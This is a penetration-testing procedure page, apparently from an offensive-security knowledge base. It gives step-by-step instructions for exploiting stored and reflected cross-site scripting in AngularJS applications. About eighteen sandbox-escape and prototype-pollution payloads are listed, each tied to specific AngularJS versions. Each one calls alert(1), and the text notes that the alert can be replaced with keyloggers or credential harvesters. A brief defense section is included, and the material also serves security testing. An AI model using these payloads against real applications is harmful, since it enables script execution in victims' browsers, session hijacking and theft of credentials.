---
type: procedure
description: >-
  Exploit stored or reflected XSS vulnerabilities in Angular and AngularJS
  applications to execute arbitrary JavaScript, demonstrated via simple alert
  payloads.
verified: true
submitted: false
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[tactics/Initial Access|TA0001]]'
  - '[[tactics/Execution|TA0002]]'
techniques:
  - '[[techniques/Command and Scripting Interpreter|T1059]]'
sub_techniques:
  - '[[sub-techniques/JavaScript|T1059.007]]'
tags:
  - '[[tags/Client Side Template Injection]]'
  - '[[tags/Stored/Reflected XSS - Simple alert in AngularJS]]'
  - '[[tags/XSS in Angular and AngularJS]]'
platforms:
  - Web
commands: []
tools: []
validated: true
---

# Angular-AngularJS-Stored-Reflected-XSS-Simple-Alert

## Summary

This procedure exploits stored or reflected cross-site scripting (XSS) vulnerabilities in Angular and AngularJS web applications by injecting malicious JavaScript payloads that execute a simple alert(1) to confirm code execution. It covers various bypass techniques for AngularJS sandboxes and prototype pollution across multiple versions, enabling arbitrary JavaScript execution in the victim's browser context for potential data theft or unauthorized actions.

## Description

Angular and AngularJS applications often process user input through client-side templates, which can lead to XSS if inputs are not properly sanitized. This procedure demonstrates injecting payloads into vulnerable input fields (e.g., forms, search boxes) to trigger JavaScript execution. Stored XSS persists the payload for multiple victims, while reflected XSS affects the current user. The payloads target AngularJS expression evaluation, constructor functions, and prototype chains to bypass built-in protections. Applicable to web environments with Angular (2+) or AngularJS (1.x) frameworks, this technique is useful in penetration testing to identify client-side injection flaws. Success confirms execution via the alert popup, which can be replaced with more malicious code like keyloggers or credential harvesters.

## Requirements

1. Access to a vulnerable Angular or AngularJS web application with unsanitized user inputs (e.g., via developer tools or direct form submission).
2. Knowledge of the application's Angular/AngularJS version to select appropriate payloads.
3. Browser-based tools like Burp Suite or browser console for injection and interception (optional but recommended for testing).
4. No server-side access required; targets client-side rendering.

## Defense

- Implement strict input validation and output encoding using Angular's built-in sanitization (e.g., DomSanitizer) or libraries like DOMPurify.
- Enable Content Security Policy (CSP) with 'unsafe-inline' restrictions and script-src 'self' to block inline JavaScript execution.
- Regularly update AngularJS to versions beyond 1.8.x (end-of-life) or migrate to modern Angular with improved security defaults.
- Use server-side rendering (SSR) or static generation to minimize client-side template risks, and monitor for anomalous JavaScript execution via browser logs or WAF rules.

## Objectives

1. Identify and exploit XSS entry points in Angular/AngularJS templates to execute JavaScript.
2. Bypass version-specific sandboxes and protections using prototype pollution or constructor injection.
3. Confirm execution with a harmless alert, validating potential for more severe payloads.
4. Demonstrate impact on user sessions, such as session hijacking or data exfiltration.

## Instructions

### Step 1: Identify Vulnerable Input Field

**Context**: Locate fields in the Angular/AngularJS app that accept user input and render it via templates (e.g., {{ }} expressions). Test for reflection by submitting '<script>alert(1)</script>' and checking if it executes; if blocked, proceed to advanced payloads.

Inspect the page source or use browser dev tools to confirm AngularJS usage (e.g., ng-app directive).

### Step 2: Inject Basic Constructor Payload

**Context**: For early AngularJS versions or basic template injection, use a constructor-based payload to create and execute a function calling alert(1). This tests direct access to global constructors.

**Code** ([[codes/AngularJS-Constructor-Direct-Alert]]):

```javascript
{{constructor.constructor('alert(1)')()}}
```

> Inject this into a template-bound input. Expected output: Alert box with '1' appears, confirming XSS.

### Step 3: Use Pop Method Constructor Bypass

**Context**: If direct constructor access is filtered, chain through array methods like pop() to reach the constructor indirectly, executing the alert.

**Code** ([[codes/AngularJS-Pop-Constructor-Alert]]):

```javascript
{{[].pop.constructor('alert(1)')()}}
```

> Submit in a reflected input field. Expected output: Alert triggers without direct constructor invocation.

### Step 4: Apply Multiple Property Access Bypasses

**Context**: Target AngularJS-specific properties like $eval or $on for execution, or use indexed access to constructor, suitable for sandboxed environments.

**Code** ([[codes/AngularJS-Multiple-Property-Alert]]):

```javascript
{{0[a='constructor'][a]('alert(1)')()}}
{{$eval.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
```

> Test each variant in sequence. Expected output: Alert from successful property chain.

### Step 5: Exploit AngularJS Sandbox Bypass via Apply and EvalAsync

**Context**: For AngularJS 1.5.9-1.5.11, manipulate scope functions like $apply and $evalAsync to inject and evaluate malicious AST nodes, bypassing the expression sandbox.

**Code** ([[codes/AngularJS-15-Sandbox-AST-Bypass]]):

```javascript
{{
    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
    c.$apply=$apply;c.$eval=b;op=$root.$$phase;
    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
    B=C(b,c,b);$evalAsync("\n    astNode=pop();astNode.type='UnaryExpression';\n    astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';\n    astNode.argument={type:'Identifier',name:'foo'};\n    ");\n    m1=B($$asyncQueue.pop().expression,null,$root);\n    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;\n    $eval('a(b.c)');[].push.apply=a;\n}}
```

> Inject into a scope-bound field. Expected output: Delayed alert after sandbox evasion.

### Step 6: Pollute String Prototype charAt for Eval Execution

**Context**: In AngularJS 1.6+, overwrite String.prototype.charAt with [].join to hijack $eval, allowing arbitrary code like alert(1).

**Code** ([[codes/AngularJS-CharAt-Prototype-Pollution-Eval]]):

```javascript
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
```

> Use in template injection points. Expected output: Alert via polluted eval.

### Step 7: Advanced charAt Pollution with Malformed Syntax Bypass

**Context**: Variant for versions where simple pollution fails, using malformed $eval to chain alert execution.

**Code** ([[codes/AngularJS-CharAt-Pollution-Malformed-Eval]]):

```javascript
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
```

> Expected output: Alert despite syntax errors in eval.

### Step 8: Basic charAt Pollution for Alert

**Context**: Core prototype pollution technique for AngularJS <=1.3.20, setting charAt to [].join for $eval hijack.

**Code** ([[codes/AngularJS-Basic-CharAt-Pollution-Alert]]):

```javascript
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
```

> Expected output: Direct alert execution.

### Step 9: __proto__ Access for charAt Pollution

**Context**: For AngularJS 1.3.19, use array indexing to access __proto__ and pollute charAt, then $eval alert.

**Code** ([[codes/AngularJS-Proto-CharAt-Pollution]]):

```javascript
{{
    'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;
    $eval('x=alert(1)//');
}}
```

> Expected output: Alert via proto pollution.

### Step 10: Object Assign Pollution Chain

**Context**: Targets AngularJS 1.3.3-1.3.18, polluting Object.assign and charAt for $eval execution.

**Code** ([[codes/AngularJS-Object-Assign-Proto-Pollution]]):

```javascript
{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;
  'a'.constructor.prototype.charAt=[].join;
  $eval('x=alert(1)//');  }}
```

> Expected output: Multi-step pollution leading to alert.

### Step 11: Variant with valueOf for charAt

**Context**: Alternative for 1.3.0-1.3.2, using valueOf instead of join for prototype overwrite.

**Code** ([[codes/AngularJS-Proto-Assign-ValueOf-Pollution]]):

```javascript
{{
    {}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;
    'a'.constructor.prototype.charAt=''.valueOf;
    $eval('x=alert(1)//');
}}
```

> Expected output: Alert via valueOf-based pollution.

### Step 12: Watchers and Function Prototype Manipulation

**Context**: For AngularJS 1.3.0, manipulate watchers and Function.prototype to inject and execute alert code.

**Code** ([[codes/AngularJS-Watchers-Function-Proto-Bypass]]):

```javascript
{{!ready && (ready = true) && (
      !call
      ? $$watchers[0].get(toString.constructor.prototype)
      : (a = apply) &&
        (apply = constructor) &&
        (valueOf = call) &&
        (''+''.toString(
          'F = Function.prototype;' +
          'F.apply = F.a;' +
          'delete F.a;' +
          'delete F.valueOf;' +
          'alert(1);'
        ))
    );}}
```

> Expected output: Alert through prototype deletion and injection.

### Step 13: charAt Overwrite with Encoded Eval

**Context**: For AngularJS 1.2.24-1.2.29, overwrite charAt with valueOf and use unicode-escaped eval for conditional alert.

**Code** ([[codes/AngularJS-CharAt-ValueOf-Encoded-Eval]]):

```javascript
{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
```

> Expected output: Alert on first execution due to window.x check.

### Step 14: toString Prototype Pollution via Sort

**Context**: Exploits AngularJS 1.2.19-1.2.23 by polluting toString.prototype and using array.sort to execute alert.

**Code** ([[codes/AngularJS-ToString-Proto-Sort-Alert]]):

```javascript
{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}
```

> Expected output: Alert triggered during sort operation.

### Step 15: Substring Call Chain for Constructor

**Context**: For AngularJS 1.2.6-1.2.18, chain substring.call to access and invoke constructor with alert.

**Code** ([[codes/AngularJS-Sub-Call-Constructor-Invoke]]):

```javascript
{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
```

> Expected output: Direct constructor call to alert.

### Step 16: Proto Access with ValueOf and Encoded Eval

**Context**: Variant for AngularJS 1.2.2-1.2.5, using __proto__ for charAt pollution and escaped eval.

**Code** ([[codes/AngularJS-Proto-ValueOf-Encoded-Eval]]):

```javascript
{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval("x='"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+"'");}}
```

> Expected output: Conditional alert execution.

### Step 17: Constructor Injection via Sub Call and Descriptor

**Context**: For AngularJS 1.2.0-1.2.1, use substring.call and property descriptors to reach and execute constructor alert.

**Code** ([[codes/AngularJS-Constructor-Sub-Call-Descriptor]]):

```javascript
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
```

> Expected output: Alert via deep property descriptor access.

### Step 18: Direct Constructor for Legacy Versions

**Context**: Fallback for AngularJS 1.0.1-1.1.5 or Vue.js hybrids, using simple constructor.constructor invocation.

**Code** ([[codes/AngularJS-Legacy-Constructor-Direct-Alert]]):

```javascript
{{constructor.constructor('alert(1)')()}}
```

> Expected output: Basic alert in unpatched legacy apps.
